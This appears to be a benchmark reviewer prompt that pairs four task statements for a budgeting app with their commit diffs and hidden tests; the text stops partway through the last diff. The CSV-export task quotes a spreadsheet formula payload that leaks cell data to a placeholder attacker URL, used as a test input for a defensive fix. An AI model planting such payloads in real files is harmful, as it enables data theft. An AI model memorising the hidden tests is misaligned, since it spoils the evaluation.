@@ -1,0 +1,1466 @@
+You are reviewing task statements for a coding benchmark. For each task below you get
+(1) the STATEMENT an agent will receive (it will NOT see the diff or the tests), and
+(2) the original commit DIFF (source + the hidden tests that will grade the agent).
+
+For each task answer, strictly:
+TASK <id>
+SOLVABLE: yes|no — could a competent engineer, given the repo before the commit and the statement alone, write code that passes the hidden tests? List every hidden-test expectation the statement does not make derivable (names, signatures, exact numbers, call arguments, edge cases).
+LEAK: yes|no — does the statement reveal the implementation (how to code it: specific internal functions/queries/APIs to call, code structure, file locations) beyond the behaviour and the public interface the tests require? Quote the leaking phrases.
+FIX: concrete minimal edits to the statement (or "none").
+
+
+================ TASK 041f9f3b6e
+---- STATEMENT
+# Merge two transactions through the API, and refuse to merge a transaction with itself
+
+The app can merge two duplicate transactions (for example a manually entered one and
+the same transaction imported from the bank) into one: the kept transaction takes
+the useful fields of the other, which is deleted. This is only available from the
+UI. Integrations built on the public API (`@actual-app/api`) cannot do it.
+
+## Required behaviour
+
+1. **API method.** Add `mergeTransactions(ids)` to the public API, where `ids` is a
+   pair of transaction ids `[id1, id2]`. It merges the two transactions with exactly
+   the same rules, validation and result as the UI merge action, and resolves to the
+   id of the transaction that is kept. Like the other mutating API methods it
+   requires an open budget. Document it in the API reference next to the other
+   transaction methods.
+
+2. **Same transaction twice.** Merging currently accepts the same transaction id
+   given twice: it passes the "exactly two transactions" check and ends up
+   deleting that transaction. Merging must instead be rejected when the two ids are
+   not distinct. The error is the existing "wrong number of transactions" error,
+   whose message must now read
+   `Merging is only possible with 2 distinct transactions, but found ...`
+   (followed, as today, by the JSON of the transactions that were passed). It is
+   used for both cases (not exactly two ids, or two equal ids). The transaction
+   must be left untouched.
+
+All other merge behaviour (amount checks, unknown ids, which fields are kept) is
+unchanged.
+
+---- DIFF (source + hidden tests: packages/loot-core/src/server/transactions/merge.test.ts)
+diff --git a/packages/api/methods.ts b/packages/api/methods.ts
+index df42679b4..f5bcf354b 100644
+--- a/packages/api/methods.ts
++++ b/packages/api/methods.ts
+@@ -211,10 +211,16 @@ export function updateTransaction(
+ 
+ export function deleteTransaction(id: TransactionEntity['id']) {
+   return send('api/transaction-delete', { id });
+ }
+ 
++export function mergeTransactions(
++  ids: [TransactionEntity['id'], TransactionEntity['id']],
++) {
++  return send('api/transactions-merge', { ids });
++}
++
+ export function getAccounts() {
+   return send('api/accounts-get');
+ }
+ 
+ export function createAccount(
+diff --git a/packages/docs/docs/api/reference.md b/packages/docs/docs/api/reference.md
+index c4a47167f..a116a296b 100644
+--- a/packages/docs/docs/api/reference.md
++++ b/packages/docs/docs/api/reference.md
+@@ -18,11 +18,12 @@ import APIList from './APIList';
+ "Transaction",
+ "addTransactions",
+ "importTransactions",
+ "getTransactions",
+ "updateTransaction",
+-"deleteTransaction"
++"deleteTransaction",
++"mergeTransactions"
+ ]} />
+ 
+ <APIList title="Accounts" sections={[
+ "Account",
+ "getAccounts",
+@@ -312,10 +313,25 @@ Update fields of a transaction. `fields` can specify any field described in [`Tr
+ 
+ <Method name="deleteTransaction" args={[{ name: 'id', type: 'id'}]} />
+ 
+ Delete a transaction.
+ 
++#### `mergeTransactions`
++
++<Method name="mergeTransactions" args={[{ name: 'ids', type: 'id[]' }]} returns="Promise<id>" />
++
++Merge exactly two distinct transactions from the same account into one. Returns the id of the surviving transaction; the other one is deleted.
++
++The order of the ids does not decide which transaction survives:
++
++- an imported transaction is kept over a manually entered one
++- otherwise, the transaction with the earlier date is kept
++
++The surviving transaction keeps its own field values and fills in any empty ones from the deleted transaction. It is marked cleared if either transaction was.
++
++The merge fails if you pass the same id twice, or if the two transactions are in different accounts, have different amounts, or are transfers to different accounts.
++
+ #### Examples
+ 
+ ```js
+ // Create a transaction of $12.00. A payee of "Kroger" will be
+ // automatically created if it does not exist already and
+diff --git a/packages/loot-core/src/server/api.ts b/packages/loot-core/src/server/api.ts
+index 168099aa0..dd819a00a 100644
+--- a/packages/loot-core/src/server/api.ts
++++ b/packages/loot-core/src/server/api.ts
+@@ -611,10 +611,15 @@ handlers['api/transaction-delete'] = withMutation(async function ({ id }) {
+ 
+   const { diff } = deleteTransaction(transactions, id);
+   return handlers['transactions-batch-update'](diff)['deleted'];
+ });
+ 
++handlers['api/transactions-merge'] = withMutation(async function ({ ids }) {
++  checkFileOpen();
++  return handlers['transactions-merge'](ids.map(id => ({ id })));
++});
++
+ handlers['api/accounts-get'] = async function () {
+   checkFileOpen();
+   const accounts: AccountEntity[] = await handlers['accounts-get']();
+   return accounts.map(account => accountModel.toExternal(account));
+ };
+diff --git a/packages/loot-core/src/server/transactions/merge.test.ts b/packages/loot-core/src/server/transactions/merge.test.ts
+index bf7587454..28aa35e8a 100644
+--- a/packages/loot-core/src/server/transactions/merge.test.ts
++++ b/packages/loot-core/src/server/transactions/merge.test.ts
+@@ -37,10 +37,23 @@ describe('Merging fails for invalid quantity', () => {
+     await expect(() =>
+       mergeTransactions([{ id: t1 }, { id: t2 }]),
+     ).rejects.toThrow('Cannot merge transactions with different amounts');
+   });
+ 
++  it('fails when the same transaction is passed twice', async () => {
++    await prepareDatabase();
++    const t1 = await db.insertTransaction({
++      account: 'one',
++      date: '2025-01-01',
++      amount: 10,
++    });
++    await expect(() =>
++      mergeTransactions([{ id: t1 }, { id: t1 }]),
++    ).rejects.toThrow('Merging is only possible with 2 distinct transactions');
++    expect(await db.getTransaction(t1)).toBeTruthy();
++  });
++
+   it("fails when transaction id doesn't exist", async () => {
+     await prepareDatabase();
+     const t1 = await db.insertTransaction({
+       account: 'one',
+       date: '2025-01-01',
+diff --git a/packages/loot-core/src/server/transactions/merge.ts b/packages/loot-core/src/server/transactions/merge.ts
+index 8a706e3bd..e42c2e0d0 100644
+--- a/packages/loot-core/src/server/transactions/merge.ts
++++ b/packages/loot-core/src/server/transactions/merge.ts
+@@ -13,13 +13,13 @@ import { batchUpdateTransactions } from '.';
+ export async function mergeTransactions(
+   transactions: Pick<TransactionEntity, 'id'>[],
+ ): Promise<TransactionEntity['id']> {
+   // make sure all values have ids
+   const txIds = transactions?.map(x => x?.id).filter(Boolean) || [];
+-  if (txIds.length !== 2) {
++  if (txIds.length !== 2 || new Set(txIds).size !== 2) {
+     throw new Error(
+-      'Merging is only possible with 2 transactions, but found ' +
++      'Merging is only possible with 2 distinct transactions, but found ' +
+         JSON.stringify(transactions),
+     );
+   }
+   const [a, b] = await mapAndValidateTransactions(txIds[0], txIds[1]);
+   const aTransferId = a.transfer_id;
+diff --git a/packages/loot-core/src/types/api-handlers.ts b/packages/loot-core/src/types/api-handlers.ts
+index 2b89b3e29..679a8c97b 100644
+--- a/packages/loot-core/src/types/api-handlers.ts
++++ b/packages/loot-core/src/types/api-handlers.ts
+@@ -132,10 +132,14 @@ export type ApiHandlers = {
+ 
+   'api/transaction-delete': (arg: {
+     id: TransactionEntity['id'];
+   }) => Promise<Awaited<ReturnType<typeof batchUpdateTransactions>>['deleted']>;
+ 
++  'api/transactions-merge': (arg: {
++    ids: [TransactionEntity['id'], TransactionEntity['id']];
++  }) => Promise<TransactionEntity['id']>;
++
+   'api/sync': () => Promise<void>;
+ 
+   'api/bank-sync': (arg?: {
+     accountId: APIAccountEntity['id'];
+   }) => Promise<void>;
+
+
+================ TASK 068185751c
+---- STATEMENT
+# CSV exports allow spreadsheet formula injection
+
+Transactions can be exported to CSV (from the app, and through the command-line
+client's `--format csv` output). Text fields such as payee, account, category and
+tag names or notes are written verbatim. A user-controlled string that starts with
+a formula character, e.g. a payee named `=HYPERLINK("http://attacker/?d="&B2,"x")`,
+is evaluated as a formula when the CSV is opened in Excel, LibreOffice Calc or
+Google Sheets.
+
+## Required behaviour
+
+- In every CSV produced by the transaction export (both the export of a given list
+  of transactions and the export of a query), any **text** cell whose value starts
+  with `=`, `+`, `-`, `@`, a tab character or a carriage return is written with a
+  single quote `'` prepended (so the payee above is exported as
+  `'=HYPERLINK(...)`). After CSV parsing, the cell value is exactly `'` followed by
+  the original string.
+- Text that does not start with one of these characters is unchanged
+  (`Acme Corp` stays `Acme Corp`).
+- **Numeric** values are never prefixed: a negative amount is still exported as a
+  plain number (an amount of -25.00 is exported as `-25`).
+- The header row and the set and order of columns are unchanged.
+- Apply the same neutralisation to the CSV output of the command-line client
+  (string cells starting with one of those characters get the `'` prefix; numbers
+  do not). A cell containing a carriage return must also be quoted there, so it
+  stays a single cell.
+
+---- DIFF (source + hidden tests: packages/loot-core/src/server/transactions/export/export-to-csv.test.ts)
+diff --git a/packages/cli/src/output.ts b/packages/cli/src/output.ts
+index c2b65d9d6..312c5058d 100644
+--- a/packages/cli/src/output.ts
++++ b/packages/cli/src/output.ts
+@@ -71,13 +71,11 @@ function formatTable(data: unknown): string {
+ function formatCsv(data: unknown): string {
+   if (!Array.isArray(data)) {
+     if (data && typeof data === 'object') {
+       const entries = Object.entries(data);
+       const header = entries.map(([k]) => escapeCsv(k)).join(',');
+-      const values = entries
+-        .map(([k, v]) => escapeCsv(formatCellValue(k, v)))
+-        .join(',');
++      const values = entries.map(([k, v]) => formatCsvCell(k, v)).join(',');
+       return header + '\n' + values;
+     }
+     return String(data);
+   }
+ 
+@@ -87,18 +85,35 @@ function formatCsv(data: unknown): string {
+ 
+   const keys = Object.keys(data[0] as Record<string, unknown>);
+   const header = keys.map(k => escapeCsv(k)).join(',');
+   const rows = data.map(row => {
+     const r = row as Record<string, unknown>;
+-    return keys.map(k => escapeCsv(formatCellValue(k, r[k]))).join(',');
++    return keys.map(k => formatCsvCell(k, r[k])).join(',');
+   });
+ 
+   return [header, ...rows].join('\n');
+ }
+ 
++const FORMULA_TRIGGERS = /^[=+\-@\t\r]/;
++
++function formatCsvCell(key: string, value: unknown): string {
++  let formatted = formatCellValue(key, value);
++  // Skip neutralization for numeric values so legitimate negative amounts
++  // like "-25.00" aren't quoted as text.
++  if (typeof value !== 'number' && FORMULA_TRIGGERS.test(formatted)) {
++    formatted = "'" + formatted;
++  }
++  return escapeCsv(formatted);
++}
++
+ function escapeCsv(value: string): string {
+-  if (value.includes(',') || value.includes('"') || value.includes('\n')) {
++  if (
++    value.includes(',') ||
++    value.includes('"') ||
++    value.includes('\n') ||
++    value.includes('\r')
++  ) {
+     return '"' + value.replace(/"/g, '""') + '"';
+   }
+   return value;
+ }
+ 
+diff --git a/packages/loot-core/src/server/transactions/export/export-to-csv.test.ts b/packages/loot-core/src/server/transactions/export/export-to-csv.test.ts
+new file mode 100644
+index 000000000..abe0bbf04
+--- /dev/null
++++ b/packages/loot-core/src/server/transactions/export/export-to-csv.test.ts
+@@ -0,0 +1,60 @@
++import { parse as csvParse } from 'csv-parse/sync';
++
++import { exportToCSV } from './export-to-csv';
++
++describe('exportToCSV', () => {
++  const accounts = [{ id: 'a1', name: 'Checking' }];
++  const categoryGroups = [
++    { name: 'Income', categories: [{ id: 'c1', name: 'Salary' }] },
++  ];
++
++  function makeTransaction(overrides: Record<string, unknown> = {}) {
++    return {
++      account: 'a1',
++      date: '2026-01-01',
++      payee: 'p1',
++      notes: '',
++      category: 'c1',
++      amount: 10000,
++      cleared: false,
++      reconciled: false,
++      ...overrides,
++    };
++  }
++
++  async function payeeCell(payeeName: string, amount = 10000) {
++    const csv = await exportToCSV(
++      [makeTransaction({ amount })],
++      accounts,
++      categoryGroups,
++      [{ id: 'p1', name: payeeName }],
++    );
++    const rows = csvParse(csv, { columns: true }) as Array<
++      Record<string, string>
++    >;
++    return { row: rows[0], csv };
++  }
++
++  it.each([
++    ['=HYPERLINK("http://attacker/?d="&B2,"x")'],
++    ['=1+1'],
++    ['+1+1'],
++    ['-2+3'],
++    ['@SUM(1+1)'],
++    ['\tHELLO'],
++    ['\rHELLO'],
++  ])('prefixes a payee starting with %j with a single quote', async payload => {
++    const { row } = await payeeCell(payload);
++    expect(row.Payee).toBe("'" + payload);
++  });
++
++  it('does not prefix payees without a leading trigger character', async () => {
++    const { row } = await payeeCell('Acme Corp');
++    expect(row.Payee).toBe('Acme Corp');
++  });
++
++  it('does not prefix negative numeric amounts', async () => {
++    const { row } = await payeeCell('Acme', -2500);
++    expect(row.Amount).toBe('-25');
++  });
++});
+diff --git a/packages/loot-core/src/server/transactions/export/export-to-csv.ts b/packages/loot-core/src/server/transactions/export/export-to-csv.ts
+index 01ff009bd..dc01b6f22 100644
+--- a/packages/loot-core/src/server/transactions/export/export-to-csv.ts
++++ b/packages/loot-core/src/server/transactions/export/export-to-csv.ts
+@@ -2,10 +2,20 @@
+ import { stringify as csvStringify } from 'csv-stringify/sync';
+ 
+ import { aqlQuery } from '#server/aql';
+ import { integerToAmount } from '#shared/util';
+ 
++const FORMULA_TRIGGERS = /^[=+\-@\t\r]/;
++
++const csvStringifyOptions = {
++  header: true,
++  cast: {
++    string: (value: string) =>
++      FORMULA_TRIGGERS.test(value) ? "'" + value : value,
++  },
++};
++
+ export async function exportToCSV(
+   transactions,
+   accounts,
+   categoryGroups,
+   payees,
+@@ -51,11 +61,11 @@ export async function exportToCSV(
+       Cleared: cleared,
+       Reconciled: reconciled,
+     }),
+   );
+ 
+-  return csvStringify(transactionsForExport, { header: true });
++  return csvStringify(transactionsForExport, csvStringifyOptions);
+ }
+ 
+ export async function exportQueryToCSV(query) {
+   const { data: transactions } = await aqlQuery(
+     query
+@@ -126,7 +136,7 @@ export async function exportQueryToCSV(query) {
+             ? 'Cleared'
+             : 'Not cleared',
+     };
+   });
+ 
+-  return csvStringify(transactionsForExport, { header: true });
++  return csvStringify(transactionsForExport, csvStringifyOptions);
+ }
+
+
+================ TASK 208283a517
+---- STATEMENT
+# Payees page counts rules of completed schedules
+
+The Payees page shows, for each payee, how many rules refer to it (the server's
+`payees-get-rule-counts` handler returns a map from payee id to that number). Every
+schedule is backed by a rule whose conditions include the schedule's payee, so
+schedules contribute to these counts. Once a schedule is marked **completed** it no
+longer does anything, yet its rule is still counted: a payee whose only rule
+belongs to a completed schedule shows "1 rule".
+
+## Required behaviour
+
+- `payees-get-rule-counts` must not count rules that belong to a completed
+  schedule. A payee whose only references are such rules gets no entry in the
+  result (its id is absent from the map, as for a payee with no rules at all).
+- Rules not linked to a schedule, and rules of schedules that are not completed,
+  are counted exactly as before.
+- On the Payees page, the rule counts must be refreshed when schedules change
+  (for example when a schedule is completed), not only when rules change.
+
+---- DIFF (source + hidden tests: packages/loot-core/src/server/payees/app.test.ts)
+diff --git a/packages/desktop-client/src/components/payees/ManagePayeesWithData.tsx b/packages/desktop-client/src/components/payees/ManagePayeesWithData.tsx
+index 3e53fd778..2f89b62d8 100644
+--- a/packages/desktop-client/src/components/payees/ManagePayeesWithData.tsx
++++ b/packages/desktop-client/src/components/payees/ManagePayeesWithData.tsx
+@@ -33,11 +33,14 @@ export function ManagePayeesWithData({
+     usePayeeRuleCounts();
+ 
+   useEffect(() => {
+     const unlisten = listen('sync-event', async event => {
+       if (event.type === 'applied') {
+-        if (event.tables.includes('rules')) {
++        if (
++          event.tables.includes('rules') ||
++          event.tables.includes('schedules')
++        ) {
+           await refetchRuleCounts();
+         }
+       }
+     });
+ 
+diff --git a/packages/desktop-client/src/components/rules/ScheduleValue.tsx b/packages/desktop-client/src/components/rules/ScheduleValue.tsx
+index 84ff3313c..13d1d8b69 100644
+--- a/packages/desktop-client/src/components/rules/ScheduleValue.tsx
++++ b/packages/desktop-client/src/components/rules/ScheduleValue.tsx
+@@ -11,11 +11,11 @@ import { useSchedules } from '#hooks/useSchedules';
+ import { describeSchedule } from '#util/schedule';
+ 
+ import { Value } from './Value';
+ 
+ type ScheduleValueProps = {
+-  value: ScheduleEntity;
++  value: ScheduleEntity['id'];
+ };
+ 
+ export function ScheduleValue({ value }: ScheduleValueProps) {
+   const { t } = useTranslation();
+   const { data: byId = {} } = usePayeesById();
+@@ -28,18 +28,12 @@ export function ScheduleValue({ value }: ScheduleValueProps) {
+         <AnimatedLoading width={10} height={10} />
+       </View>
+     );
+   }
+ 
+-  return (
+-    <Value
+-      value={value}
+-      field="rule"
+-      data={schedules}
+-      // TODO: this manual type coercion does not make much sense -
+-      // should we instead do `schedule._payee.id`?
+-      describe={schedule =>
+-        describeSchedule(schedule, byId[schedule._payee as unknown as string])
+-      }
+-    />
+-  );
++  const schedule = schedules.find(item => item.id === value);
++  const display = schedule
++    ? describeSchedule(schedule, byId[schedule._payee])
++    : t('(deleted)');
++
++  return <Value value={display} field="notes" valueIsRaw />;
+ }
+diff --git a/packages/desktop-client/src/components/schedules/schedule-edit-utils.ts b/packages/desktop-client/src/components/schedules/schedule-edit-utils.ts
+index ffe48ff1b..30fff97e8 100644
+--- a/packages/desktop-client/src/components/schedules/schedule-edit-utils.ts
++++ b/packages/desktop-client/src/components/schedules/schedule-edit-utils.ts
+@@ -1,18 +1,19 @@
+ import { extractScheduleConds } from '@actual-app/core/shared/schedules';
+ import type {
++  RuleConditionEntity,
+   RuleConditionOp,
+   ScheduleEntity,
+ } from '@actual-app/core/types/models';
+ import { t } from 'i18next';
+ 
+ import type { ScheduleFormFields } from './ScheduleEditForm';
+ 
+ export function updateScheduleConditions(
+   schedule: Partial<ScheduleEntity>,
+   fields: ScheduleFormFields,
+-): { error?: string; conditions?: unknown[] } {
++): { error?: string; conditions?: RuleConditionEntity[] } {
+   const conds = extractScheduleConds(schedule._conditions);
+ 
+   const updateCond = (
+     cond: ReturnType<typeof extractScheduleConds>[keyof ReturnType<
+       typeof extractScheduleConds
+@@ -51,8 +52,8 @@ export function updateScheduleConditions(
+       {
+         op: (fields.amountOp || 'isapprox') as RuleConditionOp,
+         field: 'amount',
+         value: fields.amount,
+       },
+-    ].filter(val => !!val),
++    ].filter((val): val is RuleConditionEntity => val != null),
+   };
+ }
+diff --git a/packages/loot-core/src/server/payees/app.test.ts b/packages/loot-core/src/server/payees/app.test.ts
+new file mode 100644
+index 000000000..9dde5d982
+--- /dev/null
++++ b/packages/loot-core/src/server/payees/app.test.ts
+@@ -0,0 +1,49 @@
++import * as db from '#server/db';
++import { loadMappings } from '#server/db/mappings';
++import { app } from '#server/payees/app';
++import { createSchedule, updateSchedule } from '#server/schedules/app';
++import {
++  insertRule,
++  loadRules,
++  resetState,
++} from '#server/transactions/transaction-rules';
++
++beforeEach(async () => {
++  await global.emptyDatabase()();
++  resetState();
++  await loadMappings();
++  await loadRules();
++});
++
++describe('payees app', () => {
++  describe('payees-get-rule-counts', () => {
++    it('counts payee rules but excludes rules linked to completed schedules', async () => {
++      const activePayeeId = await db.insertPayee({ name: 'Active Payee' });
++      const completedPayeeId = await db.insertPayee({
++        name: 'Completed Payee',
++      });
++
++      await insertRule({
++        stage: 'pre',
++        conditionsOp: 'and',
++        conditions: [{ op: 'is', field: 'payee', value: activePayeeId }],
++        actions: [{ op: 'set', field: 'category', value: null }],
++      });
++
++      const scheduleId = await createSchedule({
++        conditions: [
++          { op: 'is', field: 'payee', value: completedPayeeId },
++          { op: 'is', field: 'date', value: '2020-12-20' },
++        ],
++      });
++      await updateSchedule({
++        schedule: { id: scheduleId, completed: true },
++      });
++
++      const counts = await app.handlers['payees-get-rule-counts']();
++
++      expect(counts[activePayeeId]).toBe(1);
++      expect(counts[completedPayeeId]).toBeUndefined();
++    });
++  });
++});
+diff --git a/packages/loot-core/src/server/payees/app.ts b/packages/loot-core/src/server/payees/app.ts
+index d969e7136..7f99e0818 100644
+--- a/packages/loot-core/src/server/payees/app.ts
++++ b/packages/loot-core/src/server/payees/app.ts
+@@ -1,9 +1,10 @@
+ import { createApp } from '#server/app';
+ import * as db from '#server/db';
+ import { payeeModel } from '#server/models';
+ import { mutator } from '#server/mutators';
++import { getCompletedScheduleRuleIds } from '#server/schedules/app';
+ import { batchMessages } from '#server/sync';
+ import * as rules from '#server/transactions/transaction-rules';
+ import { undoable } from '#server/undo';
+ import { DEFAULT_MAX_DISTANCE_METERS } from '#shared/constants';
+ import type { Diff } from '#shared/util';
+@@ -71,12 +72,17 @@ async function getOrphanedPayees(): Promise<Array<Pick<PayeeEntity, 'id'>>> {
+   return await db.syncGetOrphanedPayees();
+ }
+ 
+ async function getPayeeRuleCounts() {
+   const payeeCounts: Record<PayeeEntity['id'], number> = {};
++  const completedScheduleRules = new Set(await getCompletedScheduleRuleIds());
+ 
+   rules.iterateIds(rules.getRules(), 'payee', (rule, id) => {
++    if (rule.id && completedScheduleRules.has(rule.id)) {
++      return;
++    }
++
+     if (payeeCounts[id] == null) {
+       payeeCounts[id] = 0;
+     }
+     payeeCounts[id]++;
+   });
+diff --git a/packages/loot-core/src/server/schedules/app.ts b/packages/loot-core/src/server/schedules/app.ts
+index 1947e5d47..05a6645d9 100644
+--- a/packages/loot-core/src/server/schedules/app.ts
++++ b/packages/loot-core/src/server/schedules/app.ts
+@@ -308,10 +308,13 @@ function normalizeScheduleName(name) {
+ }
+ 
+ export async function createSchedule({
+   schedule = null,
+   conditions = [],
++}: {
++  schedule?: Partial<ScheduleEntity> | null;
++  conditions?: RuleConditionEntity[];
+ } = {}): Promise<ScheduleEntity['id']> {
+   const scheduleId = schedule?.id || uuidv4();
+ 
+   const { date: dateCond } = extractScheduleConds(conditions);
+   if (dateCond == null) {
+@@ -589,10 +592,20 @@ async function getSchedule(id: string): Promise<ScheduleEntity | null> {
+   } = await aqlQuery(q('schedules').filter({ id }).select('*'));
+ 
+   return schedule ?? null;
+ }
+ 
++export async function getCompletedScheduleRuleIds(): Promise<string[]> {
++  const { data } = await aqlQuery(
++    q('schedules').filter({ completed: true }).select(['rule']),
++  );
++
++  return data
++    .map(schedule => schedule.rule)
++    .filter((rule): rule is string => !!rule);
++}
++
+ async function hasTransactionForSchedule(
+   schedule: ScheduleEntity,
+ ): Promise<boolean> {
+   const { data } = await aqlQuery(getHasTransactionsQuery([schedule]));
+ 
+diff --git a/packages/loot-core/src/types/models/rule.ts b/packages/loot-core/src/types/models/rule.ts
+index 425ed5440..d22fb3d6b 100644
+--- a/packages/loot-core/src/types/models/rule.ts
++++ b/packages/loot-core/src/types/models/rule.ts
+@@ -160,11 +160,11 @@ export type SetSplitAmountRuleActionEntity = {
+   };
+ };
+ 
+ export type LinkScheduleRuleActionEntity = {
+   op: 'link-schedule';
+-  value: ScheduleEntity;
++  value: ScheduleEntity['id'];
+ };
+ 
+ export type PrependNoteRuleActionEntity = {
+   op: 'prepend-notes';
+   value: string;
+
+
+================ TASK 23da0016d2
+---- STATEMENT
+# Currency-precision-aware amount helpers
+
+Amounts are stored as integers in minor units, and the shared amount utilities
+always assume two decimal places. The currency list already records how many
+decimal places each currency uses (e.g. 0 for JPY, KRW and IRR, 2 for USD, EUR and
+GBP; the first entry is "None", with code `''`), but nothing exposes that to the
+amount helpers. Add helpers that take a currency code into account.
+
+## Required behaviour
+
+1. **Decimal places of a currency.** The shared currencies module (the one that
+   exports the `currencies` list and `getCurrency`) exports
+   `getDecimalPlaces(currencyCode: string): number`, returning the currency's
+   number of decimal places: 0 for JPY, KRW and IRR, 2 for USD, EUR and GBP, 2 for
+   `''` (None), and 2 for an unknown code such as `XYZ`.
+
+2. **Formatting with a currency.** The shared utility
+   `integerToCurrencyWithDecimal(integerAmount)` gains an optional second argument,
+   a currency code. When it is given, the integer is formatted with that currency's
+   number of decimal places, using the current number format (separators) otherwise
+   unchanged. With the `comma-dot` format: `(1234, '')` → `'12.34'`,
+   `(1234, 'USD')` → `'12.34'`, `(1234, 'JPY')` → `'1,234'`,
+   `(1234, 'IRR')` → `'1,234'`, `(1234, 'XYZ')` → `'12.34'`. Without the argument
+   the behaviour is exactly as today (`1234` → `'12.34'`, `1200` → `'12.00'`).
+
+3. **Encoding with a currency.** The same shared utility module exports
+   `amountToCurrencyInteger(amount: number, code: string): number`, converting a
+   decimal amount to the stored integer using the currency's decimal places:
+   `(12.34, 'USD')` → `1234`, `(12.34, '')` → `1234`, `(1234, 'JPY')` → `1234`,
+   `(1234, 'IRR')` → `1234`. Encoding then formatting with the same currency
+   round-trips the amount.
+
+Existing helpers and their callers are otherwise unchanged.
+
+---- DIFF (source + hidden tests: packages/loot-core/src/shared/currencies.test.ts, packages/loot-core/src/shared/util.test.ts)
+diff --git a/packages/loot-core/src/shared/currencies.test.ts b/packages/loot-core/src/shared/currencies.test.ts
+new file mode 100644
+index 000000000..b4c934bdf
+--- /dev/null
++++ b/packages/loot-core/src/shared/currencies.test.ts
+@@ -0,0 +1,44 @@
++import { currencies, getDecimalPlaces } from './currencies';
++
++describe('getDecimalPlaces', () => {
++  it('returns 2 for empty string (None)', () => {
++    expect(getDecimalPlaces('')).toBe(2);
++  });
++
++  it('returns 0 for zero-decimal currencies', () => {
++    expect(getDecimalPlaces('JPY')).toBe(0);
++    expect(getDecimalPlaces('KRW')).toBe(0);
++    expect(getDecimalPlaces('IRR')).toBe(0);
++  });
++
++  it('returns 2 for standard currencies', () => {
++    expect(getDecimalPlaces('USD')).toBe(2);
++    expect(getDecimalPlaces('EUR')).toBe(2);
++    expect(getDecimalPlaces('GBP')).toBe(2);
++  });
++
++  it('returns 2 as safe default for unknown codes', () => {
++    expect(getDecimalPlaces('XYZ')).toBe(2);
++  });
++});
++
++describe('currency metadata', () => {
++  it.each(currencies)(
++    '$name ($code) has a numeric decimalPlaces field',
++    currency => {
++      expect(typeof currency.decimalPlaces).toBe('number');
++    },
++  );
++
++  it.each(currencies)(
++    '$name ($code) has non-negative decimalPlaces',
++    currency => {
++      expect(currency.decimalPlaces).toBeGreaterThanOrEqual(0);
++    },
++  );
++
++  it('first entry is None with code empty string and decimalPlaces 2', () => {
++    expect(currencies[0].code).toBe('');
++    expect(currencies[0].decimalPlaces).toBe(2);
++  });
++});
+diff --git a/packages/loot-core/src/shared/currencies.ts b/packages/loot-core/src/shared/currencies.ts
+index 3a8241168..50c2752b0 100644
+--- a/packages/loot-core/src/shared/currencies.ts
++++ b/packages/loot-core/src/shared/currencies.ts
+@@ -70,5 +70,9 @@ export const currencies: Currency[] = [
+ ];
+ 
+ export function getCurrency(code: string): Currency {
+   return currencies.find(c => c.code === code) || currencies[0];
+ }
++
++export function getDecimalPlaces(currencyCode: string): number {
++  return getCurrency(currencyCode)?.decimalPlaces ?? 2;
++}
+diff --git a/packages/loot-core/src/shared/util.test.ts b/packages/loot-core/src/shared/util.test.ts
+index db9406d0e..a556c21b6 100644
+--- a/packages/loot-core/src/shared/util.test.ts
++++ b/packages/loot-core/src/shared/util.test.ts
+@@ -1,8 +1,10 @@
+ import {
++  amountToCurrencyInteger,
+   currencyToAmount,
+   getNumberFormat,
++  integerToCurrencyWithDecimal,
+   looselyParseAmount,
+   setNumberFormat,
+   stringToInteger,
+   titleFirst,
+ } from './util';
+@@ -235,6 +237,71 @@ describe('utility functions', () => {
+   test('stringToInteger works with negative numbers', () => {
+     expect(stringToInteger('-3')).toBe(-3);
+     // Unicode minus
+     expect(stringToInteger('−3')).toBe(-3);
+   });
++
++  describe('integerToCurrencyWithDecimal with currency', () => {
++    beforeEach(() => {
++      setNumberFormat({ format: 'comma-dot', hideFraction: false });
++    });
++
++    test('empty string (None) uses 2dp', () => {
++      expect(integerToCurrencyWithDecimal(1234, '')).toBe('12.34');
++    });
++
++    test('USD uses 2dp', () => {
++      expect(integerToCurrencyWithDecimal(1234, 'USD')).toBe('12.34');
++    });
++
++    test('JPY uses 0dp', () => {
++      expect(integerToCurrencyWithDecimal(1234, 'JPY')).toBe('1,234');
++    });
++
++    test('IRR uses 0dp', () => {
++      expect(integerToCurrencyWithDecimal(1234, 'IRR')).toBe('1,234');
++    });
++
++    test('unknown currency XYZ defaults to 2dp', () => {
++      expect(integerToCurrencyWithDecimal(1234, 'XYZ')).toBe('12.34');
++    });
++
++    test('no currency argument preserves existing behavior', () => {
++      expect(integerToCurrencyWithDecimal(1234)).toBe('12.34');
++      expect(integerToCurrencyWithDecimal(1200)).toBe('12.00');
++    });
++  });
++
++  describe('amountToCurrencyInteger', () => {
++    test('empty string (None) uses 2dp', () => {
++      expect(amountToCurrencyInteger(12.34, '')).toBe(1234);
++    });
++
++    test('USD uses 2dp', () => {
++      expect(amountToCurrencyInteger(12.34, 'USD')).toBe(1234);
++    });
++
++    test('JPY uses 0dp (multiply by 1)', () => {
++      expect(amountToCurrencyInteger(1234, 'JPY')).toBe(1234);
++    });
++
++    test('IRR uses 0dp (multiply by 1)', () => {
++      expect(amountToCurrencyInteger(1234, 'IRR')).toBe(1234);
++    });
++
++    it.each<[number, string]>([
++      [12.34, 'USD'],
++      [1234, 'JPY'],
++      [5678, 'IRR'],
++    ])(
++      'round-trip amountToCurrencyInteger/integerToCurrencyWithDecimal: %s %s',
++      (amount, currency) => {
++        setNumberFormat({ format: 'comma-dot', hideFraction: false });
++        const encoded = amountToCurrencyInteger(amount, currency);
++        const decoded = parseFloat(
++          integerToCurrencyWithDecimal(encoded, currency).replace(/,/g, ''),
++        );
++        expect(decoded).toBeCloseTo(amount, 8);
++      },
++    );
++  });
+ });
+diff --git a/packages/loot-core/src/shared/util.ts b/packages/loot-core/src/shared/util.ts
+index 3d9b32cad..ccf7658f6 100644
+--- a/packages/loot-core/src/shared/util.ts
++++ b/packages/loot-core/src/shared/util.ts
+@@ -1,9 +1,11 @@
+ // @ts-strict-ignore
+ import { formatDistanceToNow } from 'date-fns';
+ import type { Locale } from 'date-fns';
+ 
++import { getDecimalPlaces } from './currencies';
++
+ export function last<T>(arr: Array<T>) {
+   return arr[arr.length - 1];
+ }
+ 
+ export function getChangedValues<T extends { id?: string }>(obj1: T, obj2: T) {
+@@ -451,11 +453,23 @@ export function integerToCurrency(
+   const amount = safeNumber(integerAmount) / divisor;
+ 
+   return formatter.format(amount);
+ }
+ 
+-export function integerToCurrencyWithDecimal(integerAmount: IntegerAmount) {
++export function integerToCurrencyWithDecimal(
++  integerAmount: IntegerAmount,
